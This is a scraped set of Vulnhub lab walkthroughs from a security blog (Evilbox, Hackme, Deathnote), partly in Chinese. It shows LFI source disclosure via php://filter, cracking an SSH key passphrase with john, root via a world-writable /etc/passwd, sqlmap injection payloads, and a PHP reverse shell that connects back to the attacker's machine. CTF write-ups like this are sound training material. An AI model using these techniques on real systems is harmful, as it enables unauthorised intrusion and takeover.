┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ curl http://172.16.86.147/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg== ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan] └─$ echo \"PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==\"|base64 -d \u003c?php $filename = $_GET['command']; include($filename); ?\u003e We get the source code of evil.php. (Things about php filter:https://mayi077.gitee.io/2020/08/09/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81/ ) ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:4:1","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"2. Local File Include Vulnerability As we can see in evil.php source code, the code is vulnerable to LFI, not RFI case it has not use “allow_url_open” or “allow_url_include” function. So, we just condier to use the LFI vulnerability to achive the shell. We can find a ssh private key in /home/mowree/.ssh/authorized_keys and a id_rsa, so we can consider to login ssh with id_rsa file. ┌──(v4ler1an㉿kali)-[~/Documents/tools/crack] └─$ ssh mowree@172.16.86.147 -i hash Enter passphrase for key 'hash': Well, the file has passphrase, so we need to get the passphrase. ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:4:2","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"3. hash crack jphn has a script named ssh2john, so we can brute force the passphase with john. ┌──(v4ler1an㉿kali)-[~/Documents/tools/crack] └─$ chmod 600 hash ┌──(v4ler1an㉿kali)-[~/Documents/tools/crack] └─$ python ssh2join.py hash|tee hash1 hash:$sshng$0$8$9FB14B3F3D04E90E$1192$bae426d821487bf7994f9a4dc90ebe2b551aa7f15859cb04925cce36dfb1e003ba1668c5991f11529c0c1eeae66d10ba86aca88aff2f8294204113d83332774204bd9140867600b9f9c5e5342493fc6290392e103103144da723659f04273a1ea3bfbbb4207c664fec5bb6fc7379b80b3d02984e66badf19cae4e70744809460107d98eab2576e8078d9d6dd7b9a575bfa0cd618152629338b3bf81cb80642f938fe0681a46f68277a2300f39a095facbf76aab822bd744289bed2d385b2ea2d6fb03d5d3b9b80496c954126f1f196eb8917df1dcbb5746ca11d769fe92b67a4fe20e4f34e13161314755b1a7851bfe41ed5d3cddbc34016e005fe21d3cab208ec4611a5591ca695ff29c69cebf4ce1959fb3d7add28e9a553cad3b1f86dd2e0f520b5a2662e9ef260ba7312d004c2f2e016ce8439233e646b487e34ea1f52b56d7c967f3a786d30a5be33de3c1209d8ce1ec57ead4a94c8d91f19c84b76dd725e0c155d05dc7a71fa20ee92fc9f79e58aba8794bafccd7d52953d92aac9a26ead1aa7c585bf7f37499bef1756231071c81001a67e65bdab556d20ca27ec1228314a175a4f93c674914a2952d2f9b0f5b47072e943a12829f71fc79db57c2f64dfbd3c3183cd4704a6bf716022e4987fa172bd3aca952d96ef54ade3cb87f5ecf782804cae23a0e216ecef069cf74a06223edc7934a9a90bd64c9841506d323293c8433cc9172cb0666bfcc7559d85a6543e6911d0326ca05f046ff156ed82477efc0512b3949922caa4635d02e814c543cf7237d11a636e97d842cd839b633b31bdbac0d416e1f7fba9edf42bf231ae6ecc7e424fcee7909528bde081d768fbe5e2fc82a0f2d6f3d273b0d0ecbc6f0f86b9164693c8c29cca76d30fc106e43eee3292a80a91861199595f5fca1e8acdc2d610a3aafa772ed87440323eed286b15be70d27d2a7c34f8a34dd4d4fba7da2a9d23833e8836541784b4043df103fce9f9df7c3671a546a32624af92b66a912089370d1464bccc710a6d768360e8b515204f6fa681a6779eae797aacd7461d14d4fe507e13be57c5b36d5ce13faf9132daa05b52f4880801e029d322e77a0e95d0b51f65ffff5a96b5dafb89d67035b61a82a3963c4e28d2bc8d7b39f129d2eb62ebbdc3595689198ea97c5e2ef12f45db124d20b6922d2ed5fbc401cb153559b78507e9cb0e730ab9bef2401a1ebd43f8a4cf95e6c90fb00f0404403ccd78e8fdcc1875fb5ceb766b749bb848e569c825a904336bea0aa96e379084b38bbca7589afa678bd095652e86df9d48318b74339bd485da989f41d78f554e065c684838151fdf86edb348842037feab1d82a70c6801ed6d3262279597d1dac2959487872017c7abf84f7f63c7bd4d1ca73ecccdf637eb1f6e7d9739307d890d3f172911002774b4a4ca653ff65c5e344b3a5112417794436caf6fad66fb3a61834423587d77d609da048855223d672e74da8bdf7ebd87707bcfbc9c9ab8fd65e190df954d85e77444f61f47c5353140a9b9361c6cbafbaa92ff843a0d55714c7769e038364119d14e3a7be1d435359ee3bae72f5bb0c1144f822bcd1d92bafdc85cb26d552a0701eb9a64151462e44b623ff243958c88c52a4190e2b35158a568a3f1da46823f7f61bab5b12239572550c4fc8aeb4083c4b854 ┌──(v4ler1an㉿kali)-[~/Documents/tools/crack] └─$ john hash1 --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes Cost 2 (iteration count) is 2 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status unicorn (hash) 1g 0:00:00:00 DONE (2023-11-12 22:59) 100.0g/s 124200p/s 124200c/s 124200C/s unicorn Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Now, we can login ssh with id_rsa. ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:4:3","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"4. login ssh ┌──(v4ler1an㉿kali)-[~/Documents/tools/crack] └─$ ssh mowree@172.16.86.147 -i hash Enter passphrase for key 'hash': Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 mowree@EvilBoxOne:~$ id uid=1000(mowree) gid=1000(mowree) groups=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:4:4","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"4. Privilege Escalation Now we have normal username and can login ssh, we need to be root. Find some application with root privilege: mowree@EvilBoxOne:~$ find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; -rwsr-xr-x 1 root root 436552 Jan 31 2020 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-- 1 root messagebus 51184 Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 51280 Jan 10 2019 /usr/bin/mount -rwsr-xr-x 1 root root 44440 Jul 27 2018 /usr/bin/newgrp -rwsr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd -rwsr-xr-x 1 root root 34888 Jan 10 2019 /usr/bin/umount -rwsr-xr-x 1 root root 54096 Jul 27 2018 /usr/bin/chfn -rwsr-xr-x 1 root root 44528 Jul 27 2018 /usr/bin/chsh -rwsr-xr-x 1 root root 84016 Jul 27 2018 /usr/bin/gpasswd -rwsr-xr-x 1 root root 63568 Jan 10 2019 /usr/bin/su We has not found somenthing special. Return /etc/passwd: mowree@EvilBoxOne:~$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mowree@EvilBoxOne:~$ ls -la /etc/passwd -rw-rw-rw- 1 root root 1398 Aug 16 2021 /etc/passwd Everyone can modify the /etc/passwd, So we can consider remove root’s passwd, just remove x character. But it doesn’t work. Ok, change the root’s passwd. Because the root’s passwd is stored in /etc/shadow file, so here is x . We can just change x to password’s MD5 hash,and then can change root’s password. mowree@EvilBoxOne:~$ openssl passwd -1 Password: --\u003e root's passwd is root Verifying - Password: --\u003e root $1$BVZFyXa8$KD/LR0zYZNZ1w5gurJUy4/ Change the root’s passwd: mowree@EvilBoxOne:~$ vi /etc/passwd mowree@EvilBoxOne:~$ su Password: root@EvilBoxOne:/home/mowree# id uid=0(root) gid=0(root) groups=0(root) root@EvilBoxOne:/home/mowree# ls -la /root total 24 drwx------ 3 root root 4096 Aug 16 2021 . drwxr-xr-x 18 root root 4096 Aug 16 2021 .. lrwxrwxrwx 1 root root 9 Aug 16 2021 .bash_history -\u003e /dev/null -rw-r--r-- 1 root root 3526 Aug 16 2021 .bashrc drwxr-xr-x 3 root root 4096 Aug 16 2021 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -r-------- 1 root root 31 Aug 16 2021 root.txt root@EvilBoxOne:/home/mowree# cat /root/root.txt 36QtXfdJWvdC0VavlPIApUbDlqTsBM So, that;s all. ","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:5:0","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"Notes","date":"2023-11-10","objectID":"/2023/11/vulnhub_evilbox/:6:0","tags":["Vulnhub"],"title":"Vulnhub Evilbox","uri":"/2023/11/vulnhub_evilbox/"},{"categories":["Web"],"content":"Vulnhub Training -- Hackme","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"Vulnhub Training – Hackme ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:0:0","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"Knowledge sqlmap - SQL Injection Scanner webshell - php-reverse-shell.php ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:1:0","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"1. Environment Setup OVA Download Link：https://download.vulnhub.com/hackme/hackme.ova Just download it and run in vmware, the environment OS is ubunutu 18.04, so it work well in VMware. ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:2:0","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:3:0","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"1. IP Address scan ip: ┌──(v4ler1an㉿kali)-[~/Documents/tools/proxy] └─$ sudo arp-scan -l [sudo] password for v4ler1an: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec VMware, Inc. 172.16.86.146 00:0c:29:41:bf:50 VMware, Inc. 172.16.86.254 00:50:56:f4:42:e0 VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.393 seconds (106.98 hosts/sec). 4 responded Target IP is 172.16.86.146. ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:3:1","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"2. Port Info scan target port info: ┌──(v4ler1an㉿kali)-[~/Documents/tools/proxy] └─$ nmap -T4 -A -Pn 172.16.86.146 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-09 06:46 EST Nmap scan report for 172.16.86.146 Host is up (0.0022s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA) | 256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA) |_ 256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519) 80/tcp open http Apache httpd 2.4.34 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.34 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds Avaliable ports: port service 22 ssh 80 http web ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:3:2","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"3. Web Directory The ssh service need username and password, but we don’t have yet. Access the web: scan the web directory with dirb: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ dirb http://172.16.86.146/ ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Thu Nov 9 07:25:37 2023 URL_BASE: http://172.16.86.146/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://172.16.86.146/ ---- + http://172.16.86.146/index.php (CODE:200|SIZE:100) + http://172.16.86.146/server-status (CODE:403|SIZE:301) ==\u003e DIRECTORY: http://172.16.86.146/uploads/ ---- Entering directory: http://172.16.86.146/uploads/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ----------------- END_TIME: Thu Nov 9 07:25:41 2023 DOWNLOADED: 4612 - FOUND: 2 ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:3:3","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"3. Exploit ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:4:0","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"1. SQL Injection Vulnerability The default page is login.php, a normal login page. And we can register a user through Sign up now link: We signed up a user named 123456 and password is 123456, and the login: It’s a search webpage, we can do some search action through search link. And we can test and guess, maybe it will have some vulns here. Capture the traffic via burpsuite: The page return diffrent results based on search’s values, and maybe has a SQL Injection here. Detet it with sqlmap. Frist Way # export burp suite request data into sql.txt ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ cat sql.txt POST /welcome.php HTTP/1.1 Host: 172.16.86.146 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 10 Origin: http://172.16.86.146 Connection: close Referer: http://172.16.86.146/welcome.php Cookie: PHPSESSID=cdc3pcm34pd30kqr7otellt6f4 Upgrade-Insecure-Requests: 1 search=123 # execute sqlmap with sql.txt ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sqlmap -r sql.txt --dbs --batch ___ __H__ ___ ___[,]_____ ___ ___ {1.7.10#stable} |_ -| . [)] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 07:08:48 /2023-11-09/ [07:08:48] [INFO] parsing HTTP request from 'sql.txt' [07:08:48] [INFO] resuming back-end DBMS 'mysql' [07:08:48] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: search (POST) Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: search=123' AND (SELECT 3657 FROM (SELECT(SLEEP(5)))qbbB) AND 'stnZ'='stnZ Type: UNION query Title: Generic UNION query (NULL) - 3 columns Payload: search=123' UNION ALL SELECT CONCAT(0x716b6b6a71,0x527466504e7a64425265527145465152684576647849594d6b4d4176444b6f616a76784d52667265,0x717a716271),NULL,NULL-- - --- [07:08:48] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 18.10 (cosmic) web application technology: Apache 2.4.34 back-end DBMS: MySQL \u003e= 5.0.12 [07:08:48] [INFO] fetching database names available databases [5]: [*] information_schema [*] mysql [*] performance_schema [*] sys [*] webapphacking [07:08:48] [INFO] fetched data logged to text files under '/home/v4ler1an/.local/share/sqlmap/output/172.16.86.146' [*] ending @ 07:08:48 /2023-11-09/ Second Way # execuet sqlmap with -u and --data to specify the parameter ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sqlmap -u \"http://172.16.86.146/welcome.php\" --data \"search=1\" --dbs --batch ___ __H__ ___ ___[']_____ ___ ___ {1.7.10#stable} |_ -| . ['] | .'| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 07:10:01 /2023-11-09/ [07:10:01] [INFO] resuming back-end DBMS 'mysql' [07:10:01] [INFO] testing connection to the target URL got a 302 redirect to 'http://172.16.86.146/login.php'. Do you want to follow? [Y/n] Y redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y you have not declared cookie(s), while server wants to set its own ('PHPSESSID=osmmjlnrmbg...5bv57m2d9p'). Do you want to use those [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: se","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:4:1","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"2. File Upload Vulnerability We can find a file upload method in the superamin’s page. We know that the website can execute php file, so we can upload a php webshell. Now, we user /usr/share/webshells/php/php-reverse-shell.php, modify the $ip ’s value with kali ip, and upload it to target; The shell.php ’s web path should be http://172.16.86.146/upload/shell.php, so we can access the shell.php with it. First, listen on kali with nc, and access the shell.php: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ nc -lvp 12345 listening on [any] 12345 ... id 172.16.86.146: inverse host lookup failed: Unknown host connect to [172.16.86.138] from (UNKNOWN) [172.16.86.146] 45440 Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 12:30:46 up 1:50, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ uid=33(www-data) gid=33(www-data) groups=33(www-data) $ pwd / $ uname -a Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux $ cat /proc/version Linux version 4.18.0-16-generic (buildd@lcy01-amd64-022) (gcc version 8.2.0 (Ubuntu 8.2.0-7ubuntu1)) #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:4:2","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"4. Privilege Escalation The reverse shell has not root privilege, so we need to get root through some methods. $ find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; -rwsr-xr-x 1 root root 40152 Jun 14 2022 /snap/core/16202/bin/mount ... ... -rwsr-sr-x 1 daemon daemon 51464 Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 40344 Jan 25 2018 /usr/bin/newgrp -rwsr-xr-x 1 root root 157192 Aug 23 2018 /usr/bin/sudo -rwsr--r-x 1 root root 8472 Mar 26 2019 /home/legacy/touchmenot -rwsr-xr-x 1 root root 47184 Oct 15 2018 /bin/mount ... ... We can find a touchmenot with SUID, we can execute it to get root: $ pwd /home/legacy $ ls touchmenot $ ls -la total 20 drwxr-xr-x 2 root root 4096 Mar 26 2019 . drwxr-xr-x 4 root root 4096 Mar 26 2019 .. -rwsr--r-x 1 root root 8472 Mar 26 2019 touchmenot $ ./touchmenot id uid=0(root) gid=33(www-data) groups=33(www-data) ls /root snap Has no root file in root path, so that’s all. ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:5:0","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"Notes Nothing. See you next time:) ","date":"2023-11-09","objectID":"/2023/11/vulnhub_hackme1/:6:0","tags":["Vulnhub"],"title":"Vulnhub Hackme","uri":"/2023/11/vulnhub_hackme1/"},{"categories":["Web"],"content":"Vulnhub靶场记录--Deathnote","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"Knowledge wpscan - WordPress Scanner hydra – ssh username and password brute force ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:1:0","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"1. Environment Setup 常规设置，如果使用vmware的话就需要配置一下网络。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:2:0","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:3:0","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"1. IP Address arp-scan扫一下： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec VMware, Inc. 172.16.86.145 00:0c:29:54:62:bc VMware, Inc. 172.16.86.254 00:50:56:e8:1f:a8 VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.370 seconds (108.02 hosts/sec). 4 responded ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:3:1","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"2. Port Info nmap扫下端口信息： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ nmap -T4 -A -Pn 172.16.86.145 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-09 01:23 EST Nmap scan report for 172.16.86.145 Host is up (0.0023s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA) | 256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA) |_ 256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds 开放的端口： port service 22 ssh 80 http web 22端口的登录需要账号密码，看下80端口： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.145/ \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"refresh\" content=\"1; url='http://deathnote.vuln/wordpress\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003ccente\u003e \u003cp\u003ePlease wait.....\u003c/p\u003e\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e 看起来没有什么东西，但是有提示wordpress，后续可能会用得上。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:3:2","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"3. Web Directory 看下其他目录： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ dirb http://172.16.86.145 -r ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Thu Nov 9 01:26:41 2023 URL_BASE: http://172.16.86.145/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt OPTION: Not Recursive ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://172.16.86.145/ ---- + http://172.16.86.145/index.html (CODE:200|SIZE:197) ==\u003e DIRECTORY: http://172.16.86.145/manual/ + http://172.16.86.145/robots.txt (CODE:200|SIZE:68) + http://172.16.86.145/server-status (CODE:403|SIZE:278) ==\u003e DIRECTORY: http://172.16.86.145/wordpress/ ----------------- END_TIME: Thu Nov 9 01:26:44 2023 DOWNLOADED: 4612 - FOUND: 3 存在几个可以直接访问的目录，看下robots,txt： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.145/robots.txt fuck it my dad added hint on /important.jpg ryuk please delete it 这里给了提示，直接看下important.jpg看看能不能访问到： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ curl http://172.16.86.145/important.jpg i am Soichiro Yagami, light's father i have a doubt if L is true about the assumption that light is kira i can only help you by giving something important login username : user.txt i don't know the password. find it by yourself but i think it is in the hint section of site 继续给了提示，说ssh的登录密码应该存放在user.txt中，密码需要我们自己找。 ","date":"2023-11-08","objectID":"/2023/11/vulnhub_deathnote/:3:3","tags":["Vulnhub"],"title":"Vulnhub Deathnote","uri":"/2023/11/vulnhub_deathnote/"},{"categories":["Web"],"content":"3. Exploit 上面扫描到http://172.16.86.145/wordpress/，这里我们用wpscan再扫描一下这个url看看： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ wpscan --url http://172.16.86.145 _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ Scan Aborted: The remote website is up, but does not seem to be running WordPress. ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ wpscan --url http://172.16.86.145 _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ Scan Aborted: The remote website is up, but does not seem to be running WordPress. 